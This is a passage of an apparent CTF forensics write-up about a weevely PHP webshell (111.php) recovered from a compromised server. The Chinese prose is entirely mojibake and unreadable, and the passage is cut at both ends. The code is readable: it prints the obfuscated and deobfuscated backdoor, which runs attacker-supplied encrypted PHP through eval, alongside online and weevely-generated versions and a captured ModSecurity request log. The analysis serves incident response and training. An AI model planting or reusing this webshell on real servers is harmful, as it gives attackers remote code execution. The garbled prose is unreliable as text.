¼åˆ†å¼€"></a>7é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€</h4><p>æœ€å¼€å§‹ä»¥ä¸ºï¼Œè¿™ä¸ªä¸Šä¼ æœ¨é©¬çš„æ–¹å¼ä¸ºæ¼æ´æ–¹å¼å‘¢ï¼Œæ¯”å¦‚ååºåˆ—åŒ–ï¼Œå•¥çš„ï¼Œæœ€åå‘ç°ä¸ºhttpè¯·æ±‚æ–¹å¼ã€‚</p><p><img src="/images/tiesan/image-20230505151815232.png" alt="image-20230505151815232"></p><p>åœ¨è¯¦ç»†åŒ…ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœ€åè¯·æ±‚äº†111.phpï¼Œä½†æ˜¯ä¸Šé¢ä¼¼ä¹å¹¶æ²¡æœ‰å‡ºç°111.phpï¼Œå›åˆ°accessåŒ…ï¼Œå¯¹è¿™ä¸ªæœ¨é©¬å‰é¢çš„POSTè¯·æ±‚è¿›è¡Œä¼šæ‰¾æ—¶ï¼Œä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆ</p><p><img src="/images/tiesan/image-20230505152320785.png" alt="image-20230505152320785"></p><p>å¾€ä¸‹å¯ä»¥çœ‹åˆ°ä¸€ä¸ª111.php è¢«POSTåˆ©ç”¨ï¼Œå¯ä»¥çœ‹åˆ°æ—¶curlçš„ï¼Œæ˜¯PUTä¼ å‚æ–¹å¼äº†</p><p><img src="/images/tiesan/image-20230505152435124.png" alt="image-20230505152435124"></p><p>æ¥ä¸‹æ¥ï¼Œå¼€å§‹ç ”ç©¶è¿™ä¸ªæœ¨é©¬</p><p>è¿™ä¸ª111.phpæ˜¯åœ¨ï¼ŒæœåŠ¡å™¨ä¸­çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥çœ‹çš„ï¼Œç°åœºçš„æ—¶å€™ï¼ŒæŠŠä»–ä¸‹è½½ä¸‹æ¥äº†ï¼Œå†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;=&quot;oO!tvN!y5TkuOg1fjf!&quot;;func!t!ion x($t,$k!)&#123;$c=str!len($k!);$l=s!tr&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span>=str_replace(<span class="string">&#x27;kA&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crkAeatkAekA_fkAkAunkAction&#x27;</span>);</span><br><span class="line"><span class="variable">$F</span>=<span class="string">&#x27;;$j++,$i++!)!!&#123;$o.=$t&#123;$i&#125;^$k&#123;$!j&#125;;!&#125;&#125;!return !$o;&#125;if (@pr!eg!!_&#x27;</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="string">&#x27;r=@b!ase65_en!code(!@x(@gzc!ompres!s($o),$k!));pri!nt!(&quot;$p$k!h$r$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$S</span>=<span class="string">&#x27;match(&quot;/$kh(.+)$!!kf/&quot;,@file!_get_!cont!ents!(&quot;php://in!put&quot;),$!&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;m)=!=2) &#123;@ob_star!t()!;@e!val!(@gz!uncompress(@x(@ba!se64!_deco!d&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;e($m![2!]),$k)));!$o=@ob_get!_co!ntents(!);@ob_end!_clean!();$!&#x27;</span>;</span><br><span class="line"><span class="variable">$I</span>=<span class="string">&#x27;!!$k=&quot;bd377!f!17&quot;;!$kh=&quot;9d4!cd50b4843&quot;;$kf=&quot;5b!d9ce82!0!932&quot;;$p&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;!len($t);$o=!&quot;&quot;;f!o!r($i=1;!$!i&lt;$l;)&#123;for($j=0;(!$j&lt;$c!!&amp;&amp;$i&lt;$!l)&#x27;</span>;</span><br><span class="line"><span class="variable">$J</span>=str_replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$I</span>.<span class="variable">$b</span>.<span class="variable">$H</span>.<span class="variable">$F</span>.<span class="variable">$S</span>.<span class="variable">$s</span>.<span class="variable">$e</span>.<span class="variable">$n</span>);</span><br><span class="line"><span class="variable">$V</span>=<span class="variable">$u</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$J</span>);<span class="variable">$V</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    ----------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;=&quot;oO!tvN!y5TkuOg1fjf!&quot;;func!t!ion x($t,$k!)&#123;$c=str!len($k!);$l=s!tr&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span>=str_replace(<span class="string">&#x27;kA&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crkAeatkAekA_fkAkAunkAction&#x27;</span>);</span><br><span class="line"><span class="variable">$F</span>=<span class="string">&#x27;;$j++,$i++!)!!&#123;$o.=$t&#123;$i&#125;^$k&#123;$!j&#125;;!&#125;&#125;!return !$o;&#125;if (@pr!eg!!_&#x27;</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="string">&#x27;r=@b!ase65_en!code(!@x(@gzc!ompres!s($o),$k!));pri!nt!(&quot;$p$k!h$r$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$S</span>=<span class="string">&#x27;match(&quot;/$kh(.+)$!!kf/&quot;,@file!_get_!cont!ents!(&quot;php://in!put&quot;),$!&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;m)=!=2) &#123;@ob_star!t()!;@e!val!(@gz!uncompress(@x(@ba!se64!_deco!d&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;e($m![2!]),$k)));!$o=@ob_get!_co!ntents(!);@ob_end!_clean!();$!&#x27;</span>;</span><br><span class="line"><span class="variable">$I</span>=<span class="string">&#x27;!!$k=&quot;bd377!f!17&quot;;!$kh=&quot;9d4!cd50b4843&quot;;$kf=&quot;5b!d9ce82!0!932&quot;;$p&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;!len($t);$o=!&quot;&quot;;f!o!r($i=1;!$!i&lt;$l;)&#123;for($j=0;(!$j&lt;$c!!&amp;&amp;$i&lt;$!l)&#x27;</span>;</span><br><span class="line"><span class="variable">$J</span>=str_replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$I</span>.<span class="variable">$b</span>.<span class="variable">$H</span>.<span class="variable">$F</span>.<span class="variable">$S</span>.<span class="variable">$s</span>.<span class="variable">$e</span>.<span class="variable">$n</span>);</span><br><span class="line"><span class="variable">$V</span>=<span class="variable">$u</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$J</span>);<span class="variable">$V</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$J</span>;  <span class="comment">//è¾“å‡ºä¸Šé¢é‚£ä¸ªJ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„weevelyæœ¨é©¬ï¼Œåœ¨ä¸Šå‡ å±Šé“äººä¸‰é¡¹çš„æ¯”èµ›ä¸­ï¼Œéƒ½å‡ºç°äº†ç±»ä¼¼æœ¨é©¬ã€‚</p><p>ç®€å•åˆ†æä¸€ä¸‹æœ¨é©¬ï¼Œçœ‹èµ·æ¥å¾ˆä¹±ï¼Œå…¶å®å¾ˆç®€å•çš„æ··æ·†ï¼Œä»”ç»†çœ‹<code>$J=str_replace(&#39;!&#39;,&#39;&#39;,$I.$b.$H.$F.$S.$s.$e.$n);</code>è¿™ä¸€è¡Œï¼Œå…¶å®å°±æ˜¯æŠŠä¸Šé¢æ‰€æœ‰çš„å˜é‡ä¸­ï¼æ›¿æ¢ä¸ºç©ºï¼Œå°±å¯ä»¥äº†ã€‚è¿™é‡Œç›´æ¥è¿è¡Œåæ··æ·†å°±è¡Œ,æœ€ä¸‹é¢åŠ ä¸ªecho $Jå³å¯</p><p>è¿è¡Œåå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$k</span>=<span class="string">&quot;bd377f17&quot;</span>;<span class="variable">$kh</span>=<span class="string">&quot;9d4cd50b4843&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;5bd9ce820932&quot;</span>;<span class="variable">$p</span>=<span class="string">&quot;oOtvNy5TkuOg1fjf&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;<span class="variable">$c</span>=strlen(<span class="variable">$k</span>);<span class="variable">$l</span>=strlen(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;<span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;&#125;&#125;<span class="keyword">return</span> <span class="variable">$o</span>;&#125;<span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>,@file_get_contents(<span class="string">&quot;php://input&quot;</span>),<span class="variable">$m</span>)==<span class="number">2</span>) &#123;@ob_start();@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">2</span>]),<span class="variable">$k</span>)));<span class="variable">$o</span>=@ob_get_contents();@ob_end_clean();<span class="variable">$r</span>=@base65_encode(@x(@gzcompress(<span class="variable">$o</span>),<span class="variable">$k</span>));<span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);&#125;</span><br><span class="line">-----------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;bd377f17&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;9d4cd50b4843&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;5bd9ce820932&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;oOtvNy5TkuOg1fjf&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">2</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base65_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»”ç»†çœ‹ä¸Šé¢è¿™ä¸ªä»£ç å’Œä¸‹é¢ç½‘ä¸Šæ‰¾çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç½‘ä¸Šæ‰¾åˆ°</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;7ccf8192&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;528271413977&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;f541527062a9&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;ie3xNV9ea8twe7wl&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>; <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">&#123;$kh&#125;</span>(.+)<span class="subst">&#123;$kf&#125;</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base64_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;<span class="subst">&#123;$p&#125;</span><span class="subst">&#123;$kh&#125;</span><span class="subst">&#123;$r&#125;</span><span class="subst">&#123;$kf&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”Ÿæˆçš„</span></span><br><span class="line"><span class="comment">//weevely generate 1 1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;FTxlZajQkHqbQYY5&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;</span><br><span class="line">            <span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @file_get_contents(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)));</span><br><span class="line">    <span class="variable">$o</span> = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    <span class="variable">$r</span> = @base64_encode(@x(@gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»”ç»†çœ‹ï¼Œç½‘ä¸Šæ‰¾åˆ°å’Œç”Ÿæˆçš„æœ¨é©¬</p><p><img src="/images/tiesan/image-20230505154609718.png" alt="image-20230505154609718"></p><p>åœ¨è¿™ä¸ªåœ°æ–¹ä¸º1 å’Œbase64ï¼Œè€ŒæœåŠ¡å™¨ç»™çš„é‚£ä¸ª111.phpä¸ºï¼Œ2å’Œbase65ï¼Œæˆ‘å»googleäº†å¾ˆä¹…éƒ½æ²¡æœ‰æ‰¾åˆ°weevelyçš„base65ç§ç¼–ç æ–¹å¼</p><p><img src="/images/tiesan/image-20230505154907735.png" alt="image-20230505154907735"></p><p><img src="/images/tiesan/image-20230505154931539.png" alt="image-20230505154931539"></p><p>base64æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä¹Ÿæœäº†if (@preg_match(â€œ/$kh(.+)$kf/â€œ, @file_get_contents(â€œphp://inputâ€), $m) == 1) {  ä¸º2æ—¶ï¼Œä¹Ÿæ²¡æœ‰æœåˆ°ï¼Œæ˜¾ç„¶è¿™ä¸ªæœ¨é©¬è¢«ä½œè€…ç»™æ›´æ”¹äº†ã€‚åœ¨æ¯”èµ›çš„æ—¶å€™æµªè´¹äº†å¾ˆå¤šå°‘æ—¶é—´ã€‚</p><p>è¯¦ç»†åˆ†æweevelyæœ¨é©¬å‚è€ƒè¿™ä¸ªå¤§å¸ˆå‚…çš„æ–‡ç« <code>https://xz.aliyun.com/t/11246#reply-18400</code>ï¼Œè¿™é‡Œæˆ‘å°±ä¸åšè¯¦ç»†åˆ†æäº†ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦çŸ¥é“å‡ ç‚¹å°±å¯ä»¥äº†ã€‚åœ¨æœ¨é©¬æœ€åä¼š è¾“å‡º$p$kh$r$kfè¿™å‡ ä¸ªå˜é‡çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">//æœåŠ¡å™¨æœ¨é©¬111.php</span><br><span class="line">&lt;?php</span><br><span class="line">$k = &quot;bd377f17&quot;;</span><br><span class="line">$kh = &quot;9d4cd50b4843&quot;;</span><br><span class="line">$kf = &quot;5bd9ce820932&quot;;</span><br><span class="line">$p = &quot;oOtvNy5TkuOg1fjf&quot;;</span><br><span class="line">function x($t, $k)</span><br><span class="line">&#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 1; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line">if (@preg_match(&quot;/$kh(.+)$kf/&quot;, @file_get_contents(&quot;php://input&quot;), $m) == 2) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @eval(@gzuncompress(@x(@base64_decode($m[2]), $k)));</span><br><span class="line">    $o = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    $r = @base65_encode(@x(@gzcompress($o), $k));</span><br><span class="line">    print(&quot;$p$kh$r$kf&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//è¯·æ±‚çš„è¯¦ç»†åŒ…</span><br><span class="line">--4b398f30-B--</span><br><span class="line">POST /111.php HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Content-Length: 83</span><br><span class="line">Host: 192.168.12.154</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061215 Red Hat/1.5.0.9-0.1.el4 Firefox/1.5.0.9</span><br><span class="line"></span><br><span class="line">--4b398f30-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--4b398f30-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 60</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--4b398f30-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span><br><span class="line">--4b398f30-H--</span><br><span class="line">Apache-Handler: application/x-httpd-php</span><br><span class="line">Stopwatch: 1575448316609856 1233 (- - -)</span><br><span class="line">Stopwatch2: 1575448316609856 1233; combined=36, p1=12, p2=20, p3=1, p4=0, p5=2, sr=0, sw=1, l=0, gc=0</span><br><span class="line">Response-Body-Transformed: Dechunked</span><br><span class="line">Producer: ModSecurity for Apache/2.9.2 (http://www.modsecurity.org/).</span><br><span class="line">Server: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">Engine-Mode: &quot;DETECTION_ONLY&quot;</span><br><span class="line"></span><br><span class="line">--4b398f30-Z--</span><br></pre></td></tr></table></figure><p>ä»”ç»†æ¯”è¾ƒè¿™ä¸¤ä¸ªåŒ…ï¼Œå¯ä»¥å‘ç°ï¼Œå®ƒè¯·æ±‚å’Œè¿”å›ä¿¡æ¯éƒ½å¯¹ä¸ä¸Š  khå’Œkfä»¥åŠpä¸å¯¹åº”ã€‚</p><p>ç»è¿‡æŸ¥çœ‹å¤§å¸ˆå‚…æ–‡ç« å‘ç° å…¶å®è¿™ä¸ªweevelyæœ¨é©¬çš„å¯†ç ä¸ºmd5</p><p>åŸæ–‡<code>https://www.xmsec.cc/weevely3-notes/</code><img src="/images/tiesan/image-20230505194956501.png" alt="image-20230505194956501"></p><p>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ²¡æœ‰åŸæœ¨é©¬æ–‡ä»¶ï¼Œå¦‚æœå¯†ç æ˜¯å¼±çš„é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è§£å¯†</p><p>æˆ‘çœ‹å…ˆçœ‹è‡ªå·±ç”Ÿæˆçš„æœ¨é©¬çš„key</p><figure class="highlight plaintext"><figcaption><span>generate 1 1.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//weevely generate 1 1.php</span><br><span class="line"></span><br><span class="line">&lt;?php $k = &quot;c4ca4238&quot;;</span><br><span class="line">$kh = 